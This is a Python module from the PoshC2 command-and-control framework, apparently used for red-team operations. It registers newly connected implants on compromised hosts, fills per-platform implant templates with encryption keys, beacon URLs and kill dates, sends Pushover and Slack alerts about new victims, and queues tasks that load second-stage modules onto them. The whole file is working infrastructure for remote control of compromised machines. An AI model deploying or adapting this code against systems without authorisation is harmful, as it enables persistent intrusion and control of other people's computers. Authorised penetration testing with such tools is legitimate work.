import base64
import http.client
import json
import re
import time
import urllib
from datetime import datetime, timezone

from IPy import IP

from poshc2 import Colours
from poshc2.Utils import new_implant_id, gen_key
from poshc2.server.AutoLoads import run_powershell_autoloads, run_sharp_autoloads
from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, Jitter, NotificationsProjectName
from poshc2.server.Core import get_images, get_parent_implant, build_sharp_config
from poshc2.server.ImplantType import ImplantType
from poshc2.server.database.Helpers import insert_object, update_object, select_first, select_all, get_url
from poshc2.server.database.Model import Implant, C2Server, NewTask, AutoRun


def new_implant(ip_address, type, domain, user, hostname, architecture, process_id, process_name, url_id, label=None):
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

    implant = Implant(
        id=new_implant_id(),
        url_id=url_id,  # implant.url_id[0]
        user=user,
        hostname=hostname,
        ip_address=ip_address,
        encryption_key=gen_key().decode("utf-8"),
        first_seen=now,
        last_seen=now,
        process_id=process_id,
        process_name=process_name,
        architecture=architecture,
        domain=domain,
        alive="Yes",
        sleep=select_first(C2Server.default_sleep),
        loaded_modules=None,
        type=type.name,
        label=label,
    )

    core = None

    if type.is_sharp_implant():
        core = build_sharp_config(
            beacon_uris=select_first(C2Server.urls),
            implant_id=implant.id,
            kill_date=select_first(C2Server.kill_date),
            sleep=implant.sleep,
            jitter=Jitter,
            encryption_key=implant.encryption_key,
            beacon_images=get_images()
        )
    elif type.is_python_implant():
        with open(f"{PayloadsDirectory}py_dropper.sh", 'rb') as f:
            python_implant = base64.b64encode(f.read()).decode("utf-8")

        py_implant_core = open(f"{PayloadTemplatesDirectory}/Implant-Core.py", 'r').read()
        core = py_implant_core % (
            select_first(C2Server.domain_front_header), implant.sleep, get_images(), select_first(C2Server.urls),
            select_first(C2Server.kill_date),
            python_implant, Jitter, implant.encryption_key, implant.id, select_first(C2Server.user_agent))

        with open('/tmp/pythoncore.py', 'w') as output:
            output.write(core)
    elif type.is_powershell_implant():
        ps_implant_core = open(f"{PayloadTemplatesDirectory}/Implant-Core.ps1", 'r').read()
        core = ps_implant_core % (
            implant.encryption_key, Jitter, implant.sleep, implant.id,
            implant.id, get_images(), select_first(C2Server.kill_date), select_first(C2Server.urls))
    elif type.is_jxa_implant():
        jxa_implant_core = open(f"{PayloadTemplatesDirectory}/Implant-Core.js", 'r').read()
        core = jxa_implant_core % (
            implant.encryption_key, Jitter, implant.sleep, get_images(), implant.id,
            select_first(C2Server.payload_comms_host), select_first(C2Server.kill_date), select_first(C2Server.urls))
    elif type.is_linux_implant():
        core = open(f"{PayloadTemplatesDirectory}/stage2core.so", 'rb').read().replace(b"RANDOMURI199011",
                                                                                       implant.id.encode(
                                                                                           'utf-8')).replace(
            b"RANDOMKEYDATAWENEEDTOFILLINLATERWITHSOMETHIN", implant.encryption_key.encode('utf-8'))
    elif type.is_unmanaged_implant():
            mapping = {
                "key=": implant.encryption_key,
                "randomuri=": implant.id,
                "urls=": select_first(C2Server.urls).split(","),
                "jitter=": Jitter,
                "sleep_time=": implant.sleep.replace("s", ""),  # TODO what if hours or minutes?
                "kill_date=": int(time.mktime(datetime.strptime(select_first(C2Server.kill_date), "%Y-%m-%d").timetuple())),
                "icoimage=": get_images().split(","),
            }

            config_string = ''

            for element in mapping:
                if isinstance(mapping[element], list):
                    for item in mapping[element]:
                        config_string += element
                        config_string += str(item).replace("\"", "").strip()
                        config_string += "\x00"
                else:
                    config_string += element
                    config_string += str(mapping[element]).replace("\"", "").strip()
                    config_string += "\x00"

            config_string += "CONFIG_END\x00"
            core = config_string
    if ImplantType.is_pbind_implant(type) or ImplantType.is_fcomm_implant(type):
        implant.sleep = "0s"

    insert_object(implant)
    return implant, core


def display(implant):
    print(Colours.GREEN, "")
    implant_type = ImplantType.get(implant.type)

    if implant_type.is_pbind_implant():
        url = "PBind"
    elif implant_type.is_fcomm_implant():
        url = "FComm"
    else:
        url = get_url(implant.url_id)

        if url is not None:
            url = f"URL: {url.name}"
        else:
            url = "URL: Unknown"

    print(
        f"[{implant.numeric_id}] New {implant_type.value} implant connected: (uri={implant.id} key={implant.encryption_key})")
    print(
        f"{implant.ip_address} | Time:{implant.first_seen} | PID:{str(implant.process_id)} | Process:{str(implant.process_name)} | Sleep:{str(implant.sleep)} | {(str(implant.user) + ' @ ' + str(implant.hostname))} ({implant.architecture}) | {url}")

    NotificationsEnabled = select_first(C2Server.notifications_enabled)

    try:
        is_private_ip = False

        if re.search(r"^\d*\.\d*\.\d*\.\d*$", implant.hostname.strip()):
            ip = IP(implant.hostname)
            is_private_ip = ip.iptype() == 'PRIVATE'

        if not is_private_ip:
            Pushover_APIToken = select_first(C2Server.pushover_api_token)
            Pushover_APIUser = select_first(C2Server.pushover_api_user)

            if NotificationsEnabled.lower().strip() == "yes" and Pushover_APIToken:
                conn = http.client.HTTPSConnection("api.pushover.net:443")
                conn.request("POST", "/1/messages.json",
                             urllib.parse.urlencode({
                                 "token": Pushover_APIToken,
                                 "user": Pushover_APIUser,
                                 "message": f"[{NotificationsProjectName}] - New Implant [{implant.numeric_id}]: {implant.user} @ {implant.hostname}",
                             }), {"Content-type": "application/x-www-form-urlencoded"})

                output = conn.getresponse()

                if output.status != 200:
                    data = output.read()
                    print("\nPushover error: ")
                    print(data)
        else:
            print("\nNot sending pushover notification")
    except Exception as e:
        print(f"Pushover send error: {e}")

    try:
        Slack_BotToken = select_first(C2Server.slack_bot_token)

        if NotificationsEnabled.lower().strip() == "yes" and Slack_BotToken:
            mention_userid = select_first(C2Server.slack_user_id)
            channel = select_first(C2Server.slack_channel)
            Slack_BotToken = str("Bearer ") + Slack_BotToken

            if mention_userid in ("", None):
                mention_userid = ""
            elif mention_userid.lower().strip() == "channel":
                mention_userid = "<!channel> "
            else:
                mention_userid = "<@%s> " % str(mention_userid)

            message = {"channel": channel,
                       "text": f"{mention_userid}[{NotificationsProjectName}] - New Implant: {implant.user} @ {implant.hostname}",
                       "as_user": "true",
                       "link_names": "true"}
            headers = {"Content-type": "application/json", "Authorization": Slack_BotToken}
            conn = http.client.HTTPSConnection("slack.com:443")
            conn.request("POST", "/api/chat.postMessage", json.dumps(message), headers)
            output = conn.getresponse()

            if output.status != 200:
                data = output.read()
                print("Slack error: ")
                print(data)
    except Exception as e:
        print(f"Slack send error: {e}")


def autoruns(implant):
    implant_type = ImplantType.get(implant.type)

    if implant_type.is_pbind_implant():
        label = f"Parent: {implant.ip_address}"
        update_object(Implant, {Implant.label: label}, {Implant.id: implant.id})

        new_task = NewTask(
            implant_id=get_parent_implant(implant.id).id,
            command=f"pbind-load-module {implant.numeric_id} Stage2-Core.exe",
            user="autoruns",
            child_implant_id=None
        )

        insert_object(new_task)
    elif implant_type.is_fcomm_implant():
        label = f"Parent: {implant.ip_address}"
        update_object(Implant, {Implant.label: label}, {Implant.id: implant.id})

        new_task = NewTask(
            implant_id=get_parent_implant(implant.id).id,
            command=f"fcomm-load-module {implant.numeric_id} Stage2-Core.exe",
            user="autoruns",
            child_implant_id=None
        )

        insert_object(new_task)
    elif implant_type.is_sharp_implant():
        new_task = NewTask(
            implant_id=implant.id,
            command="load-module Stage2-Core.exe",
            user="autoruns",
            child_implant_id=None
        )

        insert_object(new_task)

        new_task = NewTask(
            implant_id=implant.id,
            command="loadpowerstatus",
            user="autoruns",
            child_implant_id=None
        )

        insert_object(new_task)
        update_object(Implant, {Implant.loaded_modules: "Stage2-Core.exe"},
                      {Implant.id: implant.id})
        update_object(Implant, {Implant.label: "PSM"}, {Implant.id: implant.id})
        autoruns = select_all(AutoRun)
        if autoruns:
            for autorun in autoruns:
                run_sharp_autoloads(autorun.task, implant.id, "autoruns")
                new_task = NewTask(
                    implant_id=implant.id,
                    command=autorun.task,
                    user="autoruns",
                    child_implant_id=None
                )
                insert_object(new_task)
    elif implant_type.is_powershell_implant():
        new_task = NewTask(
            implant_id=implant.id,
            command="load-module Stage2-Core.ps1",
            user="autoruns",
            child_implant_id=None
        )

        insert_object(new_task)
        update_object(Implant, {Implant.loaded_modules: "Stage2-Core.ps1"}, {Implant.id: implant.id})
        autoruns = select_all(AutoRun)

        if autoruns:
            for autorun in autoruns:
                run_powershell_autoloads(autorun.task, implant.id, "autoruns")
                new_task = NewTask(
                    implant_id=implant.id,
                    command=autorun.task,
                    user="autoruns",
                    child_implant_id=None
                )
                insert_object(new_task)

